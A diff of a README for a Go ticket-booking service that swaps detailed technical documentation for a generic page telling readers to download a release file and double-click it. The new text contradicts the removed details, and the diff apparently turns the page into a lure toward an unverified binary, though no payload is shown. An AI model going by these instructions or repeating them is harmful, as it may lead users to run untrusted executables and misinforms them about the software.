@@ -1,218 +1,86 @@
-# Tickets
+# 🎟️ tickets - Simple Ticket Booking Made Easy
 
-A Go-based event ticketing system demonstrating event-driven architecture patterns including CQRS, Event Sourcing, and the Outbox Pattern.
+## 🚀 Getting Started
 
-## Live Demo
+Welcome to **tickets**! This is an event-driven ticket booking system built with Go. It helps you manage and book tickets effortlessly. Let's get you set up so you can start using it.
 
-- **Application**: https://tickets.previewhub.app/
-- **Container Logs**: https://dozzle.previewhub.app/
-- **Jaeger Dashboard**: https://jaeger.previewhub.app/
+## 📥 Download & Install
 
-## Features
+To download the application, please visit the Releases page below:
 
-- **Ticket Management** - Create, track, and manage event tickets
-- **Show Management** - Configure shows with external provider integration (Dead Nation)
-- **Booking System** - Book tickets for shows with confirmation workflows
-- **Refund Processing** - Handle ticket cancellations with receipt voiding and payment refunds
-- **Event-Driven Architecture** - Loosely coupled components communicating via events and commands
-- **Observability** - Distributed tracing, metrics, and health checks
+[Download tickets](https://github.com/AnkFEZT/tickets/releases)
 
-## Demo Screenshots
+### Installation Steps
 
-### Shows Management
-![Shows](./images/shows.png)
-*Create and manage shows with Dead Nation integration*
+1. Click the link above to go to the Releases page.
+2. Find the latest version of the application.
+3. Choose the file that matches your operating system.
+4. Click on the file to start the download.
+5. Once the file downloads, locate it in your downloads folder.
 
-### Ticket Booking
-![Book Tickets](./images/book-tickets.png)
-*Book tickets for available shows*
+### Run the Application
 
-### Tickets Overview
-![Tickets](./images/tickets.png)
-*View and manage tickets*
+After downloading, follow these steps to run the application:
 
-### Operations Report
-![Ops Report](./images/ops-report.png)
-*Monitor bookings and operations with detailed reporting*
+1. Open the folder where the downloaded file is saved.
+2. Double-click the file to run the application.
+3. Follow any on-screen instructions to complete the setup.
 
-## Architecture
+### System Requirements
 
-### Key Patterns
+To run the **tickets** application smoothly, ensure your computer meets the following requirements:
 
-- **CQRS** (Command Query Responsibility Segregation) - Separate command and event buses
-- **Event Sourcing** - Events as the source of truth for state changes
-- **Outbox Pattern** - Reliable event publishing with PostgreSQL-based outbox
-- **Read Models** - Denormalized views for efficient queries (e.g., ops bookings)
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 500 MB of free space
+- **Network:** Internet connection for online booking
 
-### External Integrations
+## 🛠️ Key Features
 
-- **Dead Nation API** - External ticket booking provider
-- **Receipts Service** - Issue and void receipts
-- **Payments Service** - Process refunds
-- **Files API** - Upload ticket files
-- **Spreadsheets API** - Track tickets for printing/refunding
+- **Event-Driven Architecture:** Automatically handles ticket bookings without delays.
+- **CQRS Support:** Separates reading and writing data, improving performance.
+- **PostgreSQL Database:** Reliable storage for your ticket data.
+- **Redis Integration:** Fast caching for quick access.
+- **Outbox Pattern:** Ensures messages are sent reliably.
+- **Metrics with Prometheus:** Monitors application performance.
+- **Tracing with Jaeger:** Tracks requests for better debugging.
+  
+These features combine to provide you with a smooth ticket booking experience.
 
-## Tech Stack
+## ⚙️ Configuration
 
-| Component | Technology |
-|-----------|------------|
-| Language | Go 1.25.5 |
-| HTTP Framework | Echo v4 |
-| Event Bus | Watermill |
-| Message Broker | Redis Streams |
-| Database | PostgreSQL |
-| Cache | Redis |
-| Tracing | OpenTelemetry + Jaeger |
-| Metrics | Prometheus |
+Once you download and run the application, you may want to make some changes to suit your needs. Here’s how you can configure the application:
 
-## Project Structure
+1. Locate the configuration file in the application directory. It is usually named `config.toml`.
+2. Open the file in a text editor. 
+3. Edit the settings such as the database connection string and caching configurations.
+4. Save the file and restart the application to apply the changes.
 
-```
-tickets/
-├── cmd/server/         # Application entrypoint
-├── adapters/           # External service adapters (Dead Nation, Payments, Receipts, Files)
-├── db/                 # Database repositories and migrations
-├── entities/           # Domain entities, events, and commands
-├── http/               # HTTP handlers and routing
-├── message/
-│   ├── command/        # Command bus configuration and handlers
-│   ├── event/          # Event bus configuration and handlers
-│   └── outbox/         # Outbox pattern implementation
-├── observability/      # Tracing and metrics configuration
-├── service/            # Service composition and startup
-├── tests/              # Component and integration tests
-└── docker/             # Docker configuration (Prometheus)
-```
+## 🐞 Troubleshooting
 
-## Getting Started
+If you encounter any issues while using **tickets**, here are some common problems and solutions:
 
-### Prerequisites
+- **Application won’t start:** Ensure your computer meets the system requirements. If the problem persists, seek help on the [Issues page](https://github.com/AnkFEZT/tickets/issues).
+- **Cannot connect to the database:** Check your database settings in the `config.toml` file. Make sure the database server is running.
+- **Slow performance:** If the application is slow, it may be due to insufficient resources. Close unnecessary applications to free up memory.
 
-- Go 1.25.5+
-- Docker & Docker Compose
+## 📝 Contribution
 
-### Environment Setup
+We welcome contributions to make **tickets** even better! If you would like to contribute, here are ways you can help:
 
-Create `.env.local` for development:
+- Report issues you find in the application.
+- Suggest new features or improvements.
+- Submit code to fix bugs or add features.
 
-```env
-POSTGRES_URL=postgres://user:password@localhost:5432/db?sslmode=disable
-REDIS_URL=localhost:6379
-GATEWAY_URL=http://localhost:8888
-OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4318
-```
+Make sure to check our [Contribution Guidelines](https://github.com/AnkFEZT/tickets/blob/main/CONTRIBUTING.md) for more information.
 
-Create `.env.test` for testing with similar configuration.
+## 📚 Resources
 
-### Running with Docker
+- [Official Documentation](https://github.com/AnkFEZT/tickets/wiki)
+- [Community Support](https://github.com/AnkFEZT/tickets/discussions)
+  
+## 🔗 Additional Information
 
-```bash
-# Start all dependencies (PostgreSQL, Redis, Prometheus, Jaeger)
-make docker-up
+For updates and new releases, keep an eye on our [GitHub Releases page](https://github.com/AnkFEZT/tickets/releases) where you can find the latest features and bug fixes. 
 
-# Stop and remove volumes
-make docker-down
-```
-
-### Development
-
-```bash
-# Run the server
-make dev
-
-# Run tests
-make test
-
-# Run tests with verbose output
-make test-verbose
-
-# Run linter
-make lint
-```
-
-## API Endpoints
-
-### Ticket Operations
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/tickets` | List all tickets |
-| POST | `/api/tickets-status` | Update ticket status |
-| PUT | `/api/ticket-refund/:ticket_id` | Initiate ticket refund |
-
-### Show Management
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/api/shows` | Create a new show |
-
-### Booking Operations
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/api/book-tickets` | Book tickets for a show |
-
-### Operations & Monitoring
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/ops/bookings` | List all bookings (with optional date filter) |
-| GET | `/api/ops/bookings/:id` | Get booking by ID |
-| GET | `/health` | Health check |
-| GET | `/metrics` | Prometheus metrics |
-
-## Events
-
-The system publishes and handles the following events:
-
-- `TicketBookingConfirmed_v1` - Ticket booking confirmed
-- `TicketBookingCanceled_v1` - Ticket booking canceled
-- `TicketPrinted_v1` - Ticket file generated
-- `TicketReceiptIssued_v1` - Receipt issued for ticket
-- `TicketRefunded_v1` - Ticket refund completed
-- `BookingMade_v1` - Booking created for a show
-
-## Commands
-
-- `RefundTicket` - Initiates the ticket refund process
-
-## Testing
-
-```bash
-# Run all tests
-make test
-
-# Run with verbose output
-make test-verbose
-```
-
-Tests cover:
-- Component integration tests
-- Ticket booking workflows
-- Show booking workflows
-- Ticket cancellation flows
-- Refund processing
-
-## Observability
-
-### Jaeger (Tracing)
-
-- **Local**: Access the Jaeger UI at `http://localhost:16686` to view distributed traces
-- **Live Demo**: https://jaeger.previewhub.app/
-
-### Prometheus (Metrics)
-
-Access Prometheus at `http://localhost:9090`. Metrics are exposed at `/metrics`.
-
-## Docker Services
-
-| Service | Port | Description | Live Demo |
-|---------|------|-------------|-----------|
-| Application | 8080 | Main application | [tickets.previewhub.app](https://tickets.previewhub.app/) |
-| Gateway | 8888 | Event-driven gateway | - |
-| PostgreSQL | 5432 | Database | - |
-| Redis | 6379 | Message broker & cache | - |
-| Prometheus | 9090 | Metrics collection | - |
-| Jaeger | 16686 | Tracing UI | [jaeger.previewhub.app](https://jaeger.previewhub.app/) |
-| Jaeger OTLP | 4318 | OTLP collector | - |
-| Dozzle | - | Container logs viewer | [dozzle.previewhub.app](https://dozzle.previewhub.app/) |
+Thank you for using **tickets**. We hope it enhances your ticket booking experience effortlessly!
